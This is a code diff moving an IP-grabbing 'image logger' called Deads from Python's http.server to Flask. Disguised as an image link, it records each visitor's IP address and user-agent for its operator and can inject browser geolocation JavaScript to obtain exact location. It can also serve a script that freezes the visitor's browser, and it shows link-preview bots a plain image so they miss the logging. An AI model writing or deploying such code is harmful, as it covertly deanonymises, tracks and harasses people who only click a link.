@@ -1,6 +1,8 @@
-from http.server import BaseHTTPRequestHandler
+from flask import Flask, request, Response
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+
+app = Flask(__name__)
 
 __app__ = "Deads"
 __version__ = "v1.0"
@@ -139,71 +141,63 @@ binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 }
 
-class DeadsAPI(BaseHTTPRequestHandler):
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def handleRequest(path):
+    try:
+        s = request.full_path
+        query_dict = dict(parse.parse_qsl(parse.urlsplit(s).query))
 
-    def handleRequest(self):
-        try:
-            s = self.path
-            query_dict = dict(parse.parse_qsl(parse.urlsplit(s).query))
-
-            if config["imageArgument"]:
-                if query_dict.get("url") or query_dict.get("id"):
-                    url = base64.b64decode((query_dict.get("url") or query_dict.get("id")).encode()).decode()
-                else:
-                    url = config["image"]
+        if config["imageArgument"]:
+            if query_dict.get("url") or query_dict.get("id"):
+                url = base64.b64decode((query_dict.get("url") or query_dict.get("id")).encode()).decode()
             else:
                 url = config["image"]
+        else:
+            url = config["image"]
 
-            ip = self.headers.get('x-forwarded-for') or self.headers.get('x-real-ip') or '0.0.0.0'
-            ua = self.headers.get('user-agent')
+        ip = request.headers.get('x-forwarded-for', '').split(',')[0].strip() or request.headers.get('x-real-ip') or '0.0.0.0'
+        ua = request.headers.get('user-agent', '')
 
-            data = (
-                f'<style>body{{margin:0;padding:0;}}'
-                f'div.img{{background-image:url(\'{url}\');'
-                f'background-position:center center;background-repeat:no-repeat;'
-                f'background-size:contain;width:100vw;height:100vh;}}</style>'
-                f'<div class="img"></div>'
-            ).encode()
+        html_data = (
+            f'<style>body{{margin:0;padding:0;}}'
+            f'div.img{{background-image:url(\'{url}\');'
+            f'background-position:center center;background-repeat:no-repeat;'
+            f'background-size:contain;width:100vw;height:100vh;}}</style>'
+            f'<div class="img"></div>'
+        )
 
-            if botCheck(ip, ua):
-                self.send_response(200 if config["buggedImage"] else 302)
-                if config["buggedImage"]:
-                    self.send_header('Content-type', 'image/jpeg')
-                    self.end_headers()
-                    self.wfile.write(binaries["loading"])
-                else:
-                    self.send_header('Location', url)
-                    self.end_headers()
-
-                makeReport(ip, endpoint=s.split("?")[0], url=url)
-                return
-
+        if botCheck(ip, ua):
+            if config["buggedImage"]:
+                resp = Response(binaries["loading"], mimetype='image/jpeg')
             else:
-                if query_dict.get("g") and config["accurateLocation"]:
-                    location = base64.b64decode(query_dict.get("g").encode()).decode()
-                    makeReport(ip, ua, location, s.split("?")[0], url=url)
-                else:
-                    makeReport(ip, ua, endpoint=s.split("?")[0], url=url)
+                resp = Response(status=302)
+                resp.headers['Location'] = url
 
-                message = config["message"]["message"]
+            makeReport(ip, endpoint=request.path, url=url)
+            return resp
 
-                datatype = 'text/html'
+        else:
+            if query_dict.get("g") and config["accurateLocation"]:
+                location = base64.b64decode(query_dict.get("g").encode()).decode()
+                makeReport(ip, ua, location, request.path, url=url)
+            else:
+                makeReport(ip, ua, endpoint=request.path, url=url)
 
-                if config["message"]["doMessage"]:
-                    data = message.encode()
+            message = config["message"]["message"]
+            data = html_data
 
-                if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}},100)</script>'
+            if config["message"]["doMessage"]:
+                data = message
 
-                if config["redirect"]["redirect"]:
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+            if config["crashBrowser"]:
+                data = message + '<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}},100)</script>'
 
-                self.send_response(200)
-                self.send_header('Content-type', datatype)
-                self.end_headers()
+            if config["redirect"]["redirect"]:
+                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'
 
-                if config["accurateLocation"]:
-                    data += b"""<script>
+            if config["accurateLocation"]:
+                data += """<script>
 var currenturl = window.location.href;
 if (!currenturl.includes("g=")) {
     if (navigator.geolocation) {
@@ -219,16 +213,8 @@ if (!currenturl.includes("g=")) {
 }
 </script>"""
 
-                self.wfile.write(data)
+            return Response(data, mimetype='text/html')
 
-        except Exception:
-            self.send_response(500)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            self.wfile.write(b'500 - Internal Server Error')
-            reportError(traceback.format_exc())
-
-    do_GET = handleRequest
-    do_POST = handleRequest
-
-handler = DeadsAPI
+    except Exception:
+        reportError(traceback.format_exc())
+        return Response('500 - Internal Server Error', status=500)
